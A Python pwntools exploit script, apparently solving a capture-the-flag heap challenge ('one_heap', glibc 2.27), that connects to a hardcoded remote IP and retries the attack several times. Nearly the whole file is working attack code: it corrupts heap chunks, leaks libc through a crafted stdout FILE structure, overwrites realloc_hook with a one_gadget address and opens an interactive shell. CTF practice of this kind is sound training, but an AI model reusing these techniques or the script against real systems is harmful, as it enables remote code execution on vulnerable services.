#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']
context.arch='amd64'

def ru(s): return p.recvuntil(s)


def sl(s): return p.sendline(s)


def sd(s): return p.send(s)


def menu(i):
    ru('Your choice:')
    sl(str(i))


def add(size, content):
    menu(1)
    ru('Input the size:')
    sl(str(size))
    ru('Input the content:')
    sd(content)


def delete():
    menu(2)


def debugf(s=''):
    gdb.attach(p, s)


def exp():
    dic = {
        0x18: p64(0x21),
        0x38: p64(0x21)
    }
    add(0x7f, fit(dic, filler='\xff')+'\n')          # unsorttedbin
    # pause()
    delete()
    delete()
    add(0x10, '\n')                       # here will be use
    delete()
    add(0x7f, '\n')
    add(0x7f, '\n')
    add(0x7f, '\n')
    delete()

    def ioleak(flags=0xfbad1000, over_payload='\x00'):
        """
            gen the payload that can leak libc using iofile output function
                1. it just overflow the low bit of write_base
            ioleak(flags=0xfbad1000,over_payload='\x00')
        """
        if flags & 0x800 == 0:
            flags = flags | 0x800

        if flags & 0x1000 == 0:
            flags = flags | 0x1000

        read_base = read_ptr = read_end = 0

        payload = p64(flags)
        payload += p64(read_ptr)+p64(read_end)+p64(read_base)
        payload += over_payload
        return payload

    # add(0x7f, '\x00'*8+'\x70\x77'+'\n')       # chunk A
    # add(0x7f, '\n') # main_arena: can change top
    # add(0x7f, '\n') # old_top
      
    add(0x50,'\x50\x77\n')
    # add(0x7f,'\n')            # unsortedbin
    
    add(0x7f,'\x00'*0x58+p64(0x50)+'\n')                        # change next chunk size to 0x90
    # add(0x7f, '\n')
    add(0x7f, '\x00'*0x10+ioleak(0x0)+'\n')
    libc_addr=u64(ru('Done')[8:16])
    libc_base = libc_addr-0x3ed8b0
    def ret_one():
        one_off = 0x4f2c5
        one_off = 0x4f322
        # one_off = 0x10a38c
        return libc_base+one_off
    
    realloc_hook = libc_base+0x3ebc28
    malloc_hook = libc_base+0x3ebc30
    free_hook = libc_base+0x3ed8e8
    malloc = libc_base+0x40c4b0
    realloc = libc_base+0x40c7e0
    svc_run = libc_base+0x15e450
    one=p64(ret_one())
     
    add(0x40,'\x00'*0x28+p64(0x21)+p64(realloc_hook)+'\n')
    # add(0x40, '\x00'*0x28+p64(0x21)+p64(free_hook)+'\n')
    
    add(0x10,'\n')
    
    add(0x10,one+p64(svc_run+0x42))
    # add(0x10, one+p64(svc_run+0x38))
    # add(0x10,one+p64(realloc))
    # debugf()
    add(0x10,'\n')
    # delete()
    p.interactive()


for i in range(16):
    try:
        # p = process('./one_heap',env={'LD_PRELOAD':'./libc-2.27.so'})
        p = remote('47.104.89.129', 10001)
        exp()
        break
    except:
        continue
